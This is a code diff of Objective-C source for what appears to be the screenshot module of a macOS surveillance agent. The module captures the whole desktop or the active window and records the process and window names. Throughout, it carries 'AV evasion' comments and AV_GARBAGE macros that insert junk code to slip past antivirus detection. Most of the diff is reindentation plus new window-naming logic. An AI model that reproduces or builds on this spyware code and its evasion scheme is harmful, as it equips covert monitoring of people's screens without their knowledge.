@@ -43,83 +43,109 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   // AV evasion: only on release build
   AV_GARBAGE_000
   
-  if (entireDesktop == YES) 
+    if (entireDesktop == YES)
     {
-      // AV evasion: only on release build
-      AV_GARBAGE_001
+        // AV evasion: only on release build
+        AV_GARBAGE_001
 
-      screenShot = CGWindowListCreateImage(CGRectInfinite,
+        screenShot = CGWindowListCreateImage(CGRectInfinite,
                                            kCGWindowListOptionOnScreenOnly,
                                            kCGNullWindowID,
                                            kCGWindowImageDefault);   
       
-      // AV evasion: only on release build
-      AV_GARBAGE_002
+        // AV evasion: only on release build
+        AV_GARBAGE_002
       
-      processName = [[NSString alloc] initWithString: @"Desktop"];   
-      
-      // AV evasion: only on release build
-      AV_GARBAGE_003
-      
-      windowName  = [[NSString alloc] initWithString: @"Desktop"];
-    }
-  else 
-    {   
-      // AV evasion: only on release build
-      AV_GARBAGE_004
-    
-      NSDictionary *windowInfo;
-      
-      //
-      // Looks like it's better to wait at least a second in order to be sure
-      // to get the window on the desktop in case of onProcess->Screenshot
-      //
-      sleep(1);
-      
-      // AV evasion: only on release build
-      AV_GARBAGE_003
-      
-      if ((windowInfo = getActiveWindowInfo()) == nil)
+        NSDictionary *windowInfo = getActiveWindowInfo();
+        unsigned int windowId=0;
+        sleep(1);
+        if(windowInfo != nil)
         {
-          // AV evasion: only on release build
-          AV_GARBAGE_005
+            windowId = [[windowInfo objectForKey: @"windowID"] unsignedIntValue];
+        }
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
+        if( (windowInfo == nil) || (windowId == 0))
+        {
+            processName = [[NSString alloc] initWithString: @"Desktop"];
+      
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+      
+            windowName  = [[NSString alloc] initWithString: @"Desktop"];
+        }
+        else
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+            
+            processName = [[windowInfo objectForKey: @"processName"] retain];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            windowName  = [[windowInfo objectForKey: @"windowName"] retain];
+            
+        }
+    }
+    else
+    {   
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+    
+        NSDictionary *windowInfo;
+      
+        //
+        // Looks like it's better to wait at least a second in order to be sure
+        // to get the window on the desktop in case of onProcess->Screenshot
+        //
+        sleep(1);
+      
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+      
+        if ((windowInfo = getActiveWindowInfo()) == nil)
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_005
           
-          return NO;
+            return NO;
         }
       
-      // AV evasion: only on release build
-      AV_GARBAGE_004
+        // AV evasion: only on release build
+        AV_GARBAGE_004
       
-      if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
+        if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
         {  
-          // AV evasion: only on release build
-          AV_GARBAGE_006
+            // AV evasion: only on release build
+            AV_GARBAGE_006
           
-          return NO;
+            return NO;
         }
       
-      // AV evasion: only on release build
-      AV_GARBAGE_002
+        // AV evasion: only on release build
+        AV_GARBAGE_002
       
-      screenShot = CGWindowListCreateImage(CGRectNull,
+        screenShot = CGWindowListCreateImage(CGRectNull,
                                            kCGWindowListOptionIncludingWindow,
                                            [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                            kCGWindowImageBoundsIgnoreFraming);
       
-      // AV evasion: only on release build
-      AV_GARBAGE_001
+        // AV evasion: only on release build
+        AV_GARBAGE_001
       
-      processName = [[windowInfo objectForKey: @"processName"] retain];
+        processName = [[windowInfo objectForKey: @"processName"] retain];
       
-      // AV evasion: only on release build
-      AV_GARBAGE_003
+        // AV evasion: only on release build
+        AV_GARBAGE_003
       
-      windowName  = [[windowInfo objectForKey: @"windowName"] retain];
+        windowName  = [[windowInfo objectForKey: @"windowName"] retain];
       
-      // AV evasion: only on release build
-      AV_GARBAGE_008
+        // AV evasion: only on release build
+        AV_GARBAGE_008
       
-      //[windowInfo release];
+        //[windowInfo release];
     }
   
   // AV evasion: only on release build
